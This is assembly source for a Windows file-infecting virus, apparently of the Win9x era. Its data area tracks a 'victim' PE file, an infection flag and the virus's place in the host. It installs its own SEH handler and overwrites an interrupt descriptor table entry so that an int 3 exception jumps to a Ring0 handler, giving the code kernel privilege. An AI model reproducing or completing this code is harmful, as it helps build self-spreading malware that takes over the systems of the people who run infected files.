start:
	call	get_delta

get_delta:
	pop	ebp
	sub	ebp,offset get_delta
	jmp	realstart				; jump over data

IDT_Address	dq 0					; IDT address
exception	dd 0					; exception place
old_offset	dd 0					; real old offset
flag		db 0					; infection flag
newaddress	dd 0					; new virus place
filename	db 260 dup (0)				; victim's name
handle		dd 0					; victim's handle
crt_move	dd 0					; current movement in file
sec_ptr 	dd 0					; pointer to section
Old_EIP 	dd 0					; Old Entry point
S_Align 	dd 0					; section alignment
F_Align 	dd 0					; file alignment
SOI		dd 0					; size of image
peheader	dd 0					; pe header address
virusplace	dd 0					; virus place in victim
imagebase	dd 0					; imagebase of victim

SEH_oldpointer	dd ?					; SEH saved pointer
SEH_nextpointer dd ?					; SEH structure... old pointer
SEH_errorhandler	dd ?				; new pointer

realstart:
	mov	eax,dword ptr fs:[00H]			; get the old seh pointer
	mov	dword ptr [ebp+SEH_nextpointer],eax	; set in structure
	mov	dword ptr [ebp+SEH_oldpointer],eax	; and save for restore
	lea	eax,[ebp+return_to_host]		; make it point here...
	mov	dword ptr [ebp+SEH_errorhandler],eax
	lea	eax,[ebp+SEH_nextpointer]
	mov	dword ptr fs:[00H],eax			; and point the structure

	sidt	[ebp+IDT_Address]			; Get interrupt address
	mov	esi,dword ptr [ebp+IDT_Address+2]	; (first 2 are the length)
	add	esi,exception_int*8			; get the offset for Int
	mov	dword ptr [ebp+exception],esi		; save exception place
	mov	bx,word ptr [esi+6]			; get low word
	shl	ebx,10H					; shift left
	mov	bx,word ptr [esi]			; get high word
	mov	dword ptr [ebp+old_offset],ebx		; save exception offset
	lea	eax,[ebp+offset Ring0]			; eax=new Int handler
	mov	word ptr [esi],ax			; store high word
	shr	eax,10H					; shift right
	mov	word ptr [esi+6],ax			; and store low word

go_on_to_ring0:
;	int	exception_int				; Generate exception -> Ring0 !
	int	3					; Generate exception -> Ring0 !

already_installed:
	mov	esi,dword ptr [ebp+exception]		; restore IDT address
	mov	ebx,dword ptr [ebp+old_offset]		; restore exception offset
	mov	word ptr [esi],bx			; restore exception
	shr	ebx,10H					; handler
	mov	word ptr [esi+6],bx

return_to_host:
	mov	eax,dword ptr [ebp+SEH_oldpointer]	; restore the old SEH pointer
	mov	dword ptr fs:[00H],eax

exit:
;	cmp	ebp,0
;	je	generation_1
;	mov	eax,[ebp+Old_EIP]
;	add	eax,[ebp+imagebase]
;	jmp	eax

;generation_1:
;	Push	0
;	Call	ExitProcess				; and exit

	ret
